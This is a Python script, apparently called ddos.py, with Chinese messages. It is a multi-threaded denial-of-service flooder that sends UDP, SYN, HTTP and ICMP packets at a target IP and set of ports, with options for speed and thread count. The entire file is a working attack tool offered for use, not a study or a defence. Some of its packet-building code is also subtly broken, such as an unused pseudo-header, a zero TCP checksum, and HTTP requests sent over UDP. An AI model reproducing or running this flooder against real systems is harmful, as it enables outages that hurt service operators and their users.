import os
import sys
import time
import socket
import random
import threading
from datetime import datetime
import re
import struct

def is_valid_ip(ip):
    ipv4_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ipv4_pattern.match(ip):
        parts = ip.split('.')
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    ipv6_pattern = re.compile(
        r'^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|'
        r'^::([0-9a-fA-F]{1,4}:){0,6}[0-9a-fA-F]{1,4}$|'
        r'^([0-9a-fA-F]{1,4}:){1,6}::([0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}$'
    )
    return bool(ipv6_pattern.match(ip))

class Attack:
    def __init__(self, ip, ports, packet_types=['udp'], speed=500, threads=1000):
        now = datetime.now()
        self.hour = now.hour
        self.minute = now.minute
        self.day = now.day
        self.month = now.month
        self.year = now.year
        
        if not is_valid_ip(ip):
            raise ValueError("无效的IP地址格式，请输入有效的IPv4或IPv6地址")
        self.ip = ip
        
        if not ports:
            raise ValueError("至少需要指定一个端口")
        self.ports = []
        for p in ports.split(','):
            port = p.strip()
            if not port.isdigit() or not (0 < int(port) <= 65535):
                raise ValueError(f"无效端口号: {port}")
            self.ports.append(int(port))
        
        if not packet_types:
            self.packet_types = ['udp']
        else:
            self.packet_types = [p.strip().lower() for p in packet_types.split(',')]
            valid_types = {'udp', 'syn', 'http', 'icmp'}
            for p in self.packet_types:
                if p not in valid_types:
                    raise ValueError(f"无效包类型: {p} (仅支持 udp/syn/http/icmp)")
        
        if not (1 <= speed <= 1000):
            raise ValueError("攻击速度必须在1~1 000之间")
        self.speed = speed
        
        if not (1 <= threads <= 1000000):
            raise ValueError("线程数量必须在1 ~ 1 000 000之间")
        self.threads = threads
        
        self.counter = 0
        self.lock = threading.Lock()
        self.running = True
        self.sockets = []
        self.family = socket.AF_INET6 if ':' in self.ip else socket.AF_INET

    def create_icmp_packet(self):
        icmp_type = 8
        icmp_code = 0
        checksum = 0
        identifier = random.randint(0, 65535)
        sequence = random.randint(0, 65535)
        payload = random._urandom(32)
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
        packet = header + payload
        
        checksum = 0
        for i in range(0, len(packet), 2):
            if i + 1 < len(packet):
                word = (packet[i] << 8) + packet[i + 1]
                checksum += word
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = ~checksum & 0xffff
        
        packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence) + payload
        return packet

    def create_syn_packet(self):
        src_port = random.randint(1024, 65535)
        dst_port = random.choice(self.ports)
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset = 5 << 4
        flags = 0x02
        window = socket.htons(5840)
        checksum = 0
        urg_ptr = 0
        
        if self.family == socket.AF_INET:
            src_addr = socket.inet_pton(socket.AF_INET, '0.0.0.0')
            dst_addr = socket.inet_pton(socket.AF_INET, self.ip)
            protocol = socket.IPPROTO_TCP
            tcp_length = 20
            
            pseudo_header = struct.pack('!4s4sBBH',
                                      src_addr,
                                      dst_addr,
                                      0,
                                      protocol,
                                      tcp_length)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                               src_port,
                               dst_port,
                               seq_num,
                               ack_num,
                               data_offset,
                               flags,
                               window,
                               checksum,
                               urg_ptr)
        return tcp_header

    def create_http_packet(self):
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
        path = '/' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(3, 10)))
        host = self.ip
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (Linux; Android 10; SM-G975F)'
        ]
        
        http_request = (
            f"{random.choice(methods)} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(user_agents)}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        return http_request.encode()

    def create_udp_packet(self):
        return random._urandom(1490)

    def attack_port(self, port):
        try:
            sock = socket.socket(self.family, socket.SOCK_DGRAM if 'udp' in self.packet_types else socket.SOCK_RAW)
            self.sockets.append(sock)
            
            while self.running:
                try:
                    for ptype in self.packet_types:
                        if ptype == 'udp':
                            packet = self.create_udp_packet()
                            sock.sendto(packet, (self.ip, port))
                        elif ptype == 'icmp':
                            if self.family == socket.AF_INET:
                                packet = self.create_icmp_packet()
                                sock.sendto(packet, (self.ip, 0))
                        elif ptype == 'syn':
                            packet = self.create_syn_packet()
                            sock.sendto(packet, (self.ip, port))
                        elif ptype == 'http':
                            packet = self.create_http_packet()
                            if self.family == socket.AF_INET6:
                                sock.sendto(packet, (self.ip, port, 0, 0))
                            else:
                                sock.sendto(packet, (self.ip, port))
                        
                        with self.lock:
                            self.counter += 1
                            if self.counter % 100 == 0:
                                ports_str = ','.join(map(str, self.ports))
                                types_str = ','.join(self.packet_types)
                                print(f"已发送 {self.counter} 个 {types_str} 数据包到 IP: {self.ip} 的端口: {ports_str}", end="\r")
                    
                    time.sleep((1000 - self.speed) / 2000)
                except socket.error as e:
                    print(f"\n网络错误: {e}")
                    break
                except Exception as e:
                    print(f"\n未知错误: {e}")
                    break
        except Exception as e:
            print(f"\n创建socket错误: {e}")

    def start(self):
        try:
            threads_per_port = max(1, self.threads // len(self.ports))
            for port in self.ports:
                for _ in range(threads_per_port):
                    thread = threading.Thread(target=self.attack_port, args=(port,))
                    thread.daemon = True
                    thread.start()
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print("\n正在停止攻击...")
                time.sleep(1)
        finally:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass

def print_usage():
    print("用法: python ddos.py <目标IP> <端口(多个用逗号分隔)> [选项]")
    print("选项:")
    print("  -p, --packets  包类型(多个用逗号分隔, 默认udp) 可选: udp,syn,http,icmp")
    print("  -s, --speed    攻击速度(1-1000, 默认500)")
    print("  -t, --threads  线程数(1-1000000, 默认1000)")
    print("\n示例:")
    print("  python ddos.py 192.168.1.1 80,443 -p syn,http -s 800 -t 5000")
    print("  python ddos.py 2001:db8::1 80 -p udp")

def main():
    if len(sys.argv) < 3:
        print_usage()
        return

    try:
        ip = sys.argv[1]
        ports = sys.argv[2]
        
        # 设置默认值
        packet_types = 'udp'
        speed = 500
        threads = 1000
        
        # 解析可选参数
        i = 3
        while i < len(sys.argv):
            arg = sys.argv[i]
            if arg in ('-p', '--packets'):
                i += 1
                packet_types = sys.argv[i]
            elif arg in ('-s', '--speed'):
                i += 1
                speed = int(sys.argv[i])
            elif arg in ('-t', '--threads'):
                i += 1
                threads = int(sys.argv[i])
            else:
                print(f"未知参数: {arg}")
                print_usage()
                return
            i += 1
        
        attack = Attack(ip, ports, packet_types, speed, threads)
        attack.start()
    except Exception as e:
        print(f"\n错误: {e}")
        print_usage()

if __name__ == '__main__':
    main()
